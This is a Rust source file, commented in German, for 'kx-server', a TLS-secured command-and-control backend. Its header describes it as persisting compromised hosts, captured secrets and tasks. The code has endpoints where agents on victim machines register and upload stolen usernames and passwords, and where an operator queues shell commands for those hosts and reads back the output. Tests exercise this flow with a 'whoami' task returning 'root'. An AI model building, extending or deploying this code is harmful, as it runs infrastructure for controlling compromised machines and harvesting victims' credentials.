//! Kx-Server: C2-Backend mit Host-Registry, Secrets-Storage und Dashboard.
//!
//! Startet einen TLS-gesicherten axum-Server, der kompromittierte Hosts,
//! erbeutete Secrets und Tasks persistiert. Die API ist mit einem
//! Bearer-Token geschützt; das Dashboard wird unter `/` ausgeliefert.

mod auth;
mod dashboard;
mod db;

use std::net::{SocketAddr, ToSocketAddrs};
use std::path::PathBuf;
use std::sync::Arc;

use axum::{
    extract::{Json, State},
    http::StatusCode,
    middleware,
    response::{Html, IntoResponse},
    routing::{get, post},
    Router,
};
use axum_server::tls_rustls::RustlsConfig;
use clap::Parser;
use db::{Db, HostRow, SecretRow};
use kx_core::c2::{
    self, CreateTaskRequest, HeartbeatRequest, LoginRequest, RegisterRequest, SecretUpload,
    TaskResultRequest, PATH_HEARTBEAT, PATH_HOSTS, PATH_LOGIN, PATH_REGISTER, PATH_SECRETS,
    PATH_TASKS, PATH_TASKS_CREATE, PATH_TASKS_RESULT, STATUS_PENDING,
};
use uuid::Uuid;

/// Zeigt die API-Endpunkte an.
const HELP: &str = "POST /api/register   Host registrieren\n\
                    POST /api/heartbeat   Host-Heartbeat senden\n\
                    POST /api/secrets     Secret hochladen\n\
                    GET  /api/hosts       Alle Hosts\n\
                    GET  /api/secrets     Alle Secrets\n\
                    GET  /api/tasks       Alle Tasks\n\
                    POST /api/tasks/new   Task anlegen\n\
                    POST /api/tasks/result  Task-Ergebnis melden";

#[derive(Parser)]
#[command(name = "kx-server", about = "Kx-C2-Backend")]
struct Cli {
    /// Bind-Adresse des Servers.
    #[arg(long, default_value = "127.0.0.1")]
    host: String,
    /// Port des Servers.
    #[arg(long, default_value_t = 8443)]
    port: u16,
    /// Pfad zur SQLite-Datenbank.
    #[arg(long, default_value = "kx.db")]
    db: PathBuf,
    /// Bearer-Token für die API (leer => zufällig erzeugen).
    #[arg(long, env = "KX_SERVER_TOKEN")]
    token: Option<String>,
    /// Name für das selbstsignierte Zertifikat. Er landet im
    /// SubjectAlternativeName (`DNS:<cn>`), nicht im Subject-DN — der
    /// Subject-DN bleibt der rcgen-Default. Client und Agent prüfen den
    /// Namen gegen die URL, die sie aufbauen: der Wert muss zum Host in
    /// `--server` passen, sonst schlägt der TLS-Handshake mit
    /// "certificate not valid for name" fehl.
    #[arg(long, default_value = "kx.local")]
    cn: String,
}

/// Server-Zustand: Datenbank.
///
/// Das Auth-Token steht hier nicht mehr: es wird prozessweit in
/// `KX_SERVER_TOKEN` gehalten und von der Auth-Middleware gelesen.
#[derive(Clone)]
struct AppState {
    db: Arc<Db>,
}

/// Registriert einen Host. Die Host-ID kommt aus dem Request — der Server leitet
/// sie nicht mehr aus der IP ab, sonst könnten Registrierung und Secret-Upload
/// auseinanderlaufen.
async fn register(
    State(st): State<AppState>,
    Json(req): Json<RegisterRequest>,
) -> impl IntoResponse {
    if req.host_id.is_empty() {
        return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
    }
    let now = kx_core::util::now_rfc3339();
    let host = HostRow {
        id: req.host_id,
        ip: req.ip,
        hostname: req.hostname.unwrap_or_default(),
        os: req.os.unwrap_or_default(),
        status: req.status.unwrap_or_else(|| c2::STATUS_DISCOVERED.into()),
        first_seen: now.clone(),
        last_seen: now,
    };
    match st.db.upsert_host(&host) {
        Ok(()) => StatusCode::CREATED.into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Aktualisiert das Last-Seen eines Hosts.
async fn heartbeat(
    State(st): State<AppState>,
    Json(req): Json<HeartbeatRequest>,
) -> impl IntoResponse {
    let hosts = match st.db.list_hosts() {
        Ok(h) => h,
        Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
    };
    if let Some(h) = hosts.into_iter().find(|h| h.id == req.host_id) {
        let mut h = h;
        h.last_seen = kx_core::util::now_rfc3339();
        if st.db.upsert_host(&h).is_ok() {
            StatusCode::OK.into_response()
        } else {
            StatusCode::INTERNAL_SERVER_ERROR.into_response()
        }
    } else {
        StatusCode::NOT_FOUND.into_response()
    }
}

/// Speichert ein hochgeladenes Secret.
async fn upload_secret(
    State(st): State<AppState>,
    Json(req): Json<SecretUpload>,
) -> impl IntoResponse {
    if req.host_id.is_empty() {
        return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
    }
    let secret = SecretRow {
        id: Uuid::new_v4().to_string(),
        host_id: req.host_id,
        cred_type: req.cred_type,
        username: req.username,
        password: req.password,
        source: req.source.unwrap_or_default(),
        collected_at: kx_core::util::now_rfc3339(),
    };
    match st.db.insert_secret(&secret) {
        Ok(()) => StatusCode::CREATED.into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert alle Hosts als JSON.
async fn list_hosts(State(st): State<AppState>) -> impl IntoResponse {
    match st.db.list_hosts() {
        Ok(rows) => {
            let hosts: Vec<c2::Host> = rows.into_iter().map(c2::Host::from).collect();
            Json(hosts).into_response()
        }
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert alle Secrets als JSON.
async fn list_secrets(State(st): State<AppState>) -> impl IntoResponse {
    match st.db.list_secrets() {
        Ok(rows) => {
            let secrets: Vec<c2::ExfiltratedSecret> =
                rows.into_iter().map(c2::ExfiltratedSecret::from).collect();
            Json(secrets).into_response()
        }
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Legt einen Task für einen Host an und liefert ihn in der Liste.
///
/// Vorher war die `tasks`-Tabelle stets leer; der Operator hatte keine
/// Möglichkeit, einen Auftrag zu setzen.
async fn create_task(
    State(st): State<AppState>,
    Json(req): Json<CreateTaskRequest>,
) -> impl IntoResponse {
    if req.host_id.is_empty() {
        return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
    }
    let task = db::TaskRow {
        id: Uuid::new_v4().to_string(),
        host_id: req.host_id.clone(),
        command: req.command.clone(),
        status: STATUS_PENDING.to_string(),
        result: String::new(),
        created_at: kx_core::util::now_rfc3339(),
    };
    match st.db.insert_task(&task) {
        // Der angelegte Task wird zurückgeliefert: der Operator braucht die
        // ID, um das Ergebnis später zuzuordnen.
        Ok(_) => (StatusCode::CREATED, Json(c2::Task::from(task))).into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Nimmt das Ergebnis eines ausgeführten Tasks entgegen.
///
/// Der Agent meldet hier Status und Ausgabe des Befehls zurück. Der Operator
/// liest beides anschließend unter `GET /api/tasks`.
async fn report_task_result(
    State(st): State<AppState>,
    Json(req): Json<TaskResultRequest>,
) -> impl IntoResponse {
    if req.task_id.is_empty() {
        return (StatusCode::BAD_REQUEST, "task_id darf nicht leer sein").into_response();
    }
    match st
        .db
        .update_task_result(&req.task_id, &req.status, &req.result)
    {
        Ok(true) => StatusCode::OK.into_response(),
        // Der Task existiert nicht (mehr). Der Agent darf daran erkennen, dass
        // seine Meldung ins Leere lief.
        Ok(false) => (StatusCode::NOT_FOUND, "unbekannter Task").into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert alle Tasks als JSON.
async fn list_tasks(State(st): State<AppState>) -> impl IntoResponse {
    match st.db.list_tasks() {
        Ok(rows) => {
            let tasks: Vec<c2::Task> = rows.into_iter().map(c2::Task::from).collect();
            Json(tasks).into_response()
        }
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert das HTML-Dashboard (ohne Auth).
///
/// Das HTML enthält keine Geheimnisse — die Daten holt sich das JavaScript
/// selbst per `fetch` mit `Authorization`-Header, und genau dieser `fetch`
/// läuft in einen geschützten Pfad. Ohne Anmeldung bleiben die Tabellen leer.
async fn dashboard() -> impl IntoResponse {
    Html(dashboard::DASHBOARD_HTML)
}

/// Prüft ein vom Dashboard gesendetes Token.
///
/// Der Pfad ist bewusst **nicht** durch die Auth-Middleware geschützt: er
/// prüft das Token, das er entgegennimmt. Er gehört deshalb nicht in den
/// geschützten API-Subrouter, sondern daneben.
///
/// Der Vergleich ist constant-time (siehe `auth::verify`).
async fn login(Json(req): Json<LoginRequest>) -> impl IntoResponse {
    let expected = std::env::var("KX_SERVER_TOKEN").unwrap_or_default();
    if auth::verify_token(&req.token, &expected) {
        StatusCode::OK.into_response()
    } else {
        (StatusCode::UNAUTHORIZED, "unauthorized: falsches Token").into_response()
    }
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "kx_server=info".into()),
        )
        .init();

    let cli = Cli::parse();

    // Token bestimmen: CLI > Env > zufällig.
    let cli_token_provided = cli.token.is_some();
    let token = cli
        .token
        .or_else(|| std::env::var("KX_SERVER_TOKEN").ok())
        .unwrap_or_else(|| Uuid::new_v4().to_string());
    if !cli_token_provided {
        // Der Tokenwert wird NICHT ausgegeben. Die API ist ab jetzt
        // authentifiziert, ein Token im stderr landet in Logs und im
        // Terminal-Scrollback — dort gehört er nicht hin. Der Wert bleibt
        // über KX_SERVER_TOKEN abrufbar.
        eprintln!(
            "Kx-Server: kein Token gesetzt, generiertes Token wird in KX_SERVER_TOKEN gesetzt"
        );
    }
    // auth.rs liest das Token aus der Environment-Variable.
    std::env::set_var("KX_SERVER_TOKEN", &token);

    let db = Db::open(&cli.db).expect("Datenbank nicht erreichbar");
    let state = AppState { db: Arc::new(db) };

    // TLS-Material: selbstsigniert generieren.
    let tls = kx_tls::generate_server_tls(&cli.cn).expect("TLS-Zertifikat erzeugbar");
    let cert_pem = tls.cert_pem.clone();
    let key_pem = tls.key_pem;

    // Der API-Router trägt alle fünf Vertragspfade und ist per `route_layer`
    // geschützt. Der Dashboard-Router (`GET /`) bleibt getrennt: das Dashboard
    // liefert nur HTML, die Daten holt es sich selbst per `fetch` mit
    // Authorization-Header — und genau dieser `fetch` läuft in einen
    // geschützten Pfad.
    //
    // REIHENFOLGE: alle Routen zuerst, dann `route_layer`. Axum wendet den
    // Layer nur auf die zum Aufrufzeitpunkt bereits registrierten Routen an —
    // eine danach hinzugefügte Route bliebe ungeschützt.
    let api = Router::new()
        .route(PATH_REGISTER, post(register))
        .route(PATH_HEARTBEAT, post(heartbeat))
        .route(PATH_SECRETS, post(upload_secret))
        .route(PATH_HOSTS, get(list_hosts))
        .route(PATH_SECRETS, get(list_secrets))
        .route(PATH_TASKS, get(list_tasks))
        .route(PATH_TASKS_CREATE, post(create_task))
        .route(PATH_TASKS_RESULT, post(report_task_result))
        .route_layer(middleware::from_fn(auth::require_auth));

    // Der Login-Pfad steht neben dem geschützten API-Router, nicht darin:
    // er prüft das Token, das er entgegennimmt, und würde sich sonst selbst
    // blockieren.
    let app = Router::new()
        .route("/", get(dashboard))
        .route(PATH_LOGIN, post(login))
        .merge(api)
        .with_state(state);

    let addr: SocketAddr = format!("{}:{}", cli.host, cli.port)
        .to_socket_addrs()
        .expect("Bind-Adresse auflösbar")
        .next()
        .expect("Bind-Adresse vorhanden");

    let config = RustlsConfig::from_pem(cert_pem, key_pem)
        .await
        .expect("TLS-Config");

    tracing::info!("Kx-Server lauscht auf https://{} (API: {HELP})", addr);
    axum_server::bind_rustls(addr, config)
        .serve(app.into_make_service())
        .await
        .expect("Server-Loop");
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Die Hilfetext-Auflistung nennt jeden Endpunkt, den der Router registriert.
    /// Der Hilfetext ist die sechste Fundstelle des Vertrags — er muss mitlaufen.
    #[test]
    fn help_text_lists_every_contract_path() {
        for path in [
            PATH_REGISTER,
            PATH_HEARTBEAT,
            PATH_SECRETS,
            PATH_HOSTS,
            PATH_TASKS,
            PATH_TASKS_CREATE,
            PATH_TASKS_RESULT,
        ] {
            assert!(
                HELP.contains(path),
                "der Hilfetext nennt den Endpunkt {path} nicht"
            );
        }
    }

    /// Der Router registriert genau die Endpunkte des C2-Protokolls.
    #[test]
    fn router_registers_the_contract_paths() {
        let app = Router::new()
            .route("/", get(dashboard))
            .route(PATH_REGISTER, post(register))
            .route(PATH_HEARTBEAT, post(heartbeat))
            .route(PATH_SECRETS, post(upload_secret))
            .route(PATH_HOSTS, get(list_hosts))
            .route(PATH_SECRETS, get(list_secrets))
            .route(PATH_TASKS, get(list_tasks))
            .route(PATH_TASKS_CREATE, post(create_task))
            .route(PATH_TASKS_RESULT, post(report_task_result));
        // Ohne State lässt sich der Router nicht in einen Request schicken —
        // die Route-Pfade lassen sich aber über die Debug-Ausgabe prüfen.
        let debug = format!("{app:?}");
        for path in [
            PATH_REGISTER,
            PATH_HEARTBEAT,
            PATH_SECRETS,
            PATH_HOSTS,
            PATH_TASKS,
            PATH_TASKS_CREATE,
            PATH_TASKS_RESULT,
        ] {
            assert!(debug.contains(path), "der Router registriert {path} nicht");
        }
    }

    /// Der Auth-Test, der gefehlt hat: ohne Token muss jeder Vertragspfad 401
    /// liefern, mit falschem ebenso, mit korrektem 200.
    ///
    /// Vor diesem Fix gab es keinen Auth-Test, und die Routen waren offen.
    #[tokio::test]
    async fn api_paths_require_a_valid_bearer_token() {
        // Das Token kommt prozessweit aus der Environment-Variable.
        std::env::set_var("KX_SERVER_TOKEN", "test-token");
        let db = Arc::new(Db::open(&std::env::temp_dir().join("kx-auth-test.db")).expect("db"));
        let state = AppState { db };

        let api = Router::new()
            .route(PATH_REGISTER, post(register))
            .route(PATH_HEARTBEAT, post(heartbeat))
            .route(PATH_SECRETS, post(upload_secret))
            .route(PATH_HOSTS, get(list_hosts))
            .route(PATH_SECRETS, get(list_secrets))
            .route(PATH_TASKS, get(list_tasks))
            .route(PATH_TASKS_CREATE, post(create_task))
            .route(PATH_TASKS_RESULT, post(report_task_result))
            .route_layer(middleware::from_fn(auth::require_auth));
        let app = Router::new()
            .route("/", get(dashboard))
            .merge(api)
            .with_state(state);

        for path in [
            PATH_REGISTER,
            PATH_HEARTBEAT,
            PATH_SECRETS,
            PATH_HOSTS,
            PATH_TASKS,
            PATH_TASKS_CREATE,
            PATH_TASKS_RESULT,
        ] {
            // Ohne Token.
            let res = app
                .clone()
                .oneshot(
                    Request::builder()
                        .uri(path)
                        .body(axum::body::Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();
            assert_eq!(
                res.status(),
                StatusCode::UNAUTHORIZED,
                "{path} ist ohne Token nicht abgewiesen worden"
            );

            // Mit falschem Token.
            let res = app
                .clone()
                .oneshot(
                    Request::builder()
                        .uri(path)
                        .header("authorization", "Bearer falsch")
                        .body(axum::body::Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();
            assert_eq!(
                res.status(),
                StatusCode::UNAUTHORIZED,
                "{path} ist mit falschem Token nicht abgewiesen worden"
            );
        }

        // Mit korrektem Token wird der Handler erreicht.
        let res = app
            .oneshot(
                Request::builder()
                    .uri(PATH_HOSTS)
                    .header("authorization", "Bearer test-token")
                    .body(axum::body::Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::OK);
    }

    /// Ein unbekannter Pfad liefert 404, nicht 401 — die Middleware läuft nur,
    /// wenn die Anfrage auf eine Route trifft. Sonst verriete der Server, ob
    /// ein Pfad existiert.
    #[tokio::test]
    async fn unknown_path_is_404_not_401() {
        std::env::set_var("KX_SERVER_TOKEN", "test-token");
        let db = Arc::new(Db::open(&std::env::temp_dir().join("kx-404-test.db")).expect("db"));
        let state = AppState { db };

        let api = Router::new()
            .route(PATH_HOSTS, get(list_hosts))
            .route_layer(middleware::from_fn(auth::require_auth));
        let app = Router::new()
            .route("/", get(dashboard))
            .merge(api)
            .with_state(state);

        let res = app
            .oneshot(
                Request::builder()
                    .uri("/api/gibtsnicht")
                    .body(axum::body::Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::NOT_FOUND);
    }

    /// Der Login-Pfad prüft das Token, das er entgegennimmt: korrekt → 200,
    /// falsch → 401. Er steht bewusst neben dem geschützten API-Router.
    #[tokio::test]
    async fn login_path_checks_the_token_it_receives() {
        std::env::set_var("KX_SERVER_TOKEN", "test-token");
        let db = Arc::new(Db::open(&std::env::temp_dir().join("kx-login-test.db")).expect("db"));
        let state = AppState { db };

        let api = Router::new()
            .route(PATH_HOSTS, get(list_hosts))
            .route_layer(middleware::from_fn(auth::require_auth));
        let app = Router::new()
            .route("/", get(dashboard))
            .route(PATH_LOGIN, post(login))
            .merge(api)
            .with_state(state);

        // Falsches Token → 401.
        let res = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(PATH_LOGIN)
                    .header("content-type", "application/json")
                    .body(Body::from(r#"{"token":"falsch"}"#))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::UNAUTHORIZED);

        // Korrektes Token → 200.
        let res = app
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(PATH_LOGIN)
                    .header("content-type", "application/json")
                    .body(Body::from(r#"{"token":"test-token"}"#))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::OK);
    }

    use axum::body::Body;
    use axum::extract::Request;
    use tower::ServiceExt;

    /// Das Anlegen eines Tasks füllt die `tasks`-Tabelle. Vorher war die
    /// Tabelle stets leer — `GET /api/tasks` lieferte `[]`.
    #[tokio::test]
    async fn create_task_fills_the_task_table() {
        std::env::set_var("KX_SERVER_TOKEN", "test-token");
        // Eigene DB-Datei pro Lauf: ein fester Name sammelt ueber mehrere
        // Testlaeufe Zeilen auf und macht die Zaehlung unbrauchbar.
        let path = std::env::temp_dir().join(format!("kx-tasks-{}.db", uuid::Uuid::new_v4()));
        let db = Arc::new(Db::open(&path).expect("db"));
        let state = AppState { db };
        let api = Router::new()
            .route(PATH_TASKS, get(list_tasks))
            .route(PATH_TASKS_CREATE, post(create_task))
            .route(PATH_TASKS_RESULT, post(report_task_result))
            .route_layer(middleware::from_fn(auth::require_auth));
        let app = Router::new().merge(api).with_state(state);

        let res = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(PATH_TASKS_CREATE)
                    .header("authorization", "Bearer test-token")
                    .header("content-type", "application/json")
                    .body(Body::from(r#"{"host_id":"10.0.0.5","command":"whoami"}"#))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::CREATED);

        let res = app
            .oneshot(
                Request::builder()
                    .uri(PATH_TASKS)
                    .header("authorization", "Bearer test-token")
                    .body(axum::body::Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(res.into_body(), 1024 * 1024)
            .await
            .expect("Task-Liste serialisiert");
        let body = String::from_utf8(bytes.to_vec()).expect("Task-Liste als UTF-8");
        assert!(
            body.contains("whoami"),
            "der Task fehlt in der Liste: {body}"
        );
        assert!(body.contains("pending"), "der Status fehlt: {body}");
        std::fs::remove_file(&path).ok();
    }

    /// Der vollstaendige Task-Fluss: der Operator legt einen Task an, der
    /// Agent meldet das Ergebnis zurueck, und der Operator liest es unter
    /// `GET /api/tasks` wieder aus.
    ///
    /// Das ist der Weg, den ISSUE-6 beschreibt — vorher gab es weder einen
    /// Schreibpfad fuer die Tabelle noch eine Ergebnisrueckmeldung.
    #[tokio::test]
    async fn task_result_flows_back_into_the_task_list() {
        std::env::set_var("KX_SERVER_TOKEN", "test-token");
        let path = std::env::temp_dir().join(format!("kx-task-flow-{}.db", uuid::Uuid::new_v4()));
        let db = Arc::new(Db::open(&path).expect("db"));
        let state = AppState { db };
        let api = Router::new()
            .route(PATH_TASKS, get(list_tasks))
            .route(PATH_TASKS_CREATE, post(create_task))
            .route(PATH_TASKS_RESULT, post(report_task_result))
            .route_layer(middleware::from_fn(auth::require_auth));
        let app = Router::new().merge(api).with_state(state);

        // 1. Der Operator legt den Task an.
        let res = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(PATH_TASKS_CREATE)
                    .header("authorization", "Bearer test-token")
                    .header("content-type", "application/json")
                    .body(Body::from(r#"{"host_id":"10.0.0.5","command":"whoami"}"#))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::CREATED);

        // 2. Die ID des Tasks steht in der Liste — sie braucht der Agent,
        //    um sein Ergebnis zuzuordnen.
        let res = app
            .clone()
            .oneshot(
                Request::builder()
                    .uri(PATH_TASKS)
                    .header("authorization", "Bearer test-token")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let bytes = axum::body::to_bytes(res.into_body(), 1024 * 1024)
            .await
            .expect("Task-Liste serialisiert");
        let body = String::from_utf8(bytes.to_vec()).expect("Task-Liste als UTF-8");
        let tasks: Vec<kx_core::c2::Task> = serde_json::from_str(&body).expect("Task-Liste lesbar");
        assert_eq!(tasks.len(), 1, "es sollte genau einen Task geben: {body}");
        let task_id = tasks[0].id.clone();

        // 3. Der Agent meldet das Ergebnis.
        let res = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(PATH_TASKS_RESULT)
                    .header("authorization", "Bearer test-token")
                    .header("content-type", "application/json")
                    .body(Body::from(format!(
                        r#"{{"task_id":"{task_id}","status":"done","result":"root"}}"#
                    )))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::OK);

        // 4. Der Operator liest das Ergebnis wieder aus.
        let res = app
            .oneshot(
                Request::builder()
                    .uri(PATH_TASKS)
                    .header("authorization", "Bearer test-token")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let bytes = axum::body::to_bytes(res.into_body(), 1024 * 1024)
            .await
            .expect("Task-Liste serialisiert");
        let body = String::from_utf8(bytes.to_vec()).expect("Task-Liste als UTF-8");
        let tasks: Vec<kx_core::c2::Task> = serde_json::from_str(&body).expect("Task-Liste lesbar");
        assert_eq!(tasks[0].status, "done");
        assert_eq!(tasks[0].result, "root");
        std::fs::remove_file(&path).ok();
    }

    /// Eine Ergebnisrueckmeldung zu einem unbekannten Task liefert 404 —
    /// der Agent darf daran erkennen, dass sein Auftrag nicht (mehr) offen ist.
    #[tokio::test]
    async fn task_result_for_an_unknown_task_is_404() {
        std::env::set_var("KX_SERVER_TOKEN", "test-token");
        let path = std::env::temp_dir().join(format!("kx-task-404-{}.db", uuid::Uuid::new_v4()));
        let db = Arc::new(Db::open(&path).expect("db"));
        let state = AppState { db };
        let api = Router::new()
            .route(PATH_TASKS_RESULT, post(report_task_result))
            .route_layer(middleware::from_fn(auth::require_auth));
        let app = Router::new().merge(api).with_state(state);

        let res = app
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(PATH_TASKS_RESULT)
                    .header("authorization", "Bearer test-token")
                    .header("content-type", "application/json")
                    .body(Body::from(
                        r#"{"task_id":"gibtsnicht","status":"done","result":"x"}"#,
                    ))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::NOT_FOUND);
        std::fs::remove_file(&path).ok();
    }
}
